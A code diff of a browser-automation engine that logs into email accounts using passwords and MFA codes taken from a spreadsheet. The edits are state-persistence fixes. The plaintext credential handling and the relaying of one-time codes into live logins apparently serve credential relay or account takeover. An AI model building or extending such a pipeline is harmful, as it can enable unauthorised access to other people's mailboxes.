@@ -1531,10 +1531,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
             });
             platform = matchedPlatformKey || 'unknown';
+            updateData.platform = platform;
             platformConfig = platformConfigs[platform] || {};
         } else if (row[columnIndexes['platform']]) {
             // Email is empty (e.g. cleared by STRICTLY_MISMATCH), fall back to stored platform
             platform = row[columnIndexes['platform']];
+            updateData.platform = platform;
             platformConfig = platformConfigs[platform] || {};
             logger.debug(`[processRow][${browserId}] No email available. Using stored platform: '${platform}'`);
         }
@@ -1658,8 +1660,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found. Setting status to PROCESSING.`);
                         logger.info(`[engineProcess][${browserId}] +WAITINGEMAIL (found email)`);
                         activelyProcessing.add(browserId);
-                        await updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
+                        await updateBrowserRowDataFast(browserId, { status: "PROCESSING", email: currentEmail, verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
                         email = currentEmail; // Update the email variable for subsequent use
+                        updateData.email = email; // Persist to updateData so later writes (e.g. WAITINGPASSWORD_ERROR) don't clear it
                         emailProvidedAndProcessed = true;
                         // Refresh password from cache or sheet — user may have submitted it alongside email
                         if (freshPassword && String(freshPassword).trim() !== "") {
@@ -1708,6 +1711,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
                         });
                         platform = matchedPlatformKey || 'unknown';
+                        updateData.platform = platform;
                         platformConfig = platformConfigs[platform] || {};
 
                         initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true); // For email retry, reuse session, no navigation
@@ -1997,6 +2001,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             const cachedRowForEmail = getCachedRow(browserId);
                             if (cachedRowForEmail?.email) {
                                 email = cachedRowForEmail.email;
+                                updateData.email = email;
                                 logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Restored email from cache: '${email}'`);
                             }
                         }
@@ -2010,6 +2015,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 return cfg.mxKeywords && cfg.mxKeywords.some(kw => restoredDomain.includes(kw) || restoredMxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
                             });
                             platform = restoredPlatformKey || 'outlook';
+                            updateData.platform = platform;
                             platformConfig = platformConfigs[platform] || {};
                             logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Re-derived platform from restored email: '${platform}'`);
                         }
@@ -3925,6 +3931,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             finalStatus = "FAILED";
         }
 
+        // Include viewName in lastJsonResponse so WAITINGCODE/WAITINGOPTIONS re-entry
+        // can identify the correct code entry view type (e.g. Outlook Authenticator OTP)
+        // rather than falling through to generic selectors (#iOttText etc.).
+        const finalViewName = initialCheckResult.viewName || (JSON.parse(updateData.lastJsonResponse || '{}').viewName) || '';
         updateData = {
             status: finalStatus,
             lastJsonResponse: JSON.stringify({
@@ -3935,6 +3945,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 requiresVerification: initialCheckResult.requiresVerification,
                 verificationState: initialCheckResult.verificationState,
                 verificationOptions: currentVerificationOptions,
+                viewName: finalViewName,
                 platform, timestamp: new Date().toISOString(),
                 message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.")
             })
@@ -4103,37 +4114,25 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
         const finalSheetUpdate = { ...updateData };
-        // Always include email and password in final write so sheet never loses them
-        if (email) finalSheetUpdate.email = email;
-        if (password) finalSheetUpdate.password = password;
+        // Restore email/password from function scope for terminal states only (COMPLETED/FAILED).
+        // WAITING states already updated the sheet directly via updateBrowserRowDataFast; restoring here
+        // would overwrite intentional clears (e.g. WAITINGPASSWORD_ERROR clearing the wrong password).
+        if (!finalSheetUpdate.status?.startsWith("WAITING")) {
+            if (email) finalSheetUpdate.email = email;
+            if (password) finalSheetUpdate.password = password;
+        }
         if (finalSheetUpdate.status === "FAILED" && processingStarted) {
             notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
         } else if (finalSheetUpdate.status === "FAILED" && !processingStarted) {
             logger.info(`[processRow][${browserId}] Skipping FAILED notification — processing never started.`);
         }
-        // Removed explicit clearing of verification fields as per user request
-        // if (finalSheetUpdate.status === "COMPLETED") {
-        //     finalSheetUpdate.verificationOptions = '';
-        //     finalSheetUpdate.verificationChoice = '';
-        //     finalSheetUpdate.verificationCode = '';
-        // } else if (finalSheetUpdate.status === "WAITINGCODE") {
-        //     finalSheetUpdate.verificationChoice = '';
-        //     if (!finalSheetUpdate.hasOwnProperty('verificationCode')) {
-        //         finalSheetUpdate.verificationCode = '';
-        //     }
-        // } else if (finalSheetUpdate.status === "WAITINGOPTIONS") {
-        //     finalSheetUpdate.verificationCode = '';
-        //     if (!finalSheetUpdate.hasOwnProperty('verificationChoice')) {
-        //         finalSheetUpdate.verificationChoice = '';
-        //     }
-        //     if (!finalSheetUpdate.hasOwnProperty('verificationOptions')) {
-        //         finalSheetUpdate.verificationOptions = '';
-        //     }
-        // }
-
-        // Don't skip sheet update — FAILED status MUST always be written to sheet + Hub
         if (exitingEarly) {
             logger.info(`[processRow][${browserId}] Skipping sheet update — exitingEarly.`);
+        } else if (finalSheetUpdate.status?.startsWith("WAITING")) {
+            // For waiting states, the handler already updated the sheet + cache via updateBrowserRowDataFast.
+            // Skipping here prevents the finally block from restoring email/password that the
+            // handler intentionally cleared (e.g. wrong password cleared by WAITINGPASSWORD_ERROR).
+            logger.info(`[processRow][${browserId}] Skipping sheet update — waiting state already handled.`);
         } else {
             logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
             await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
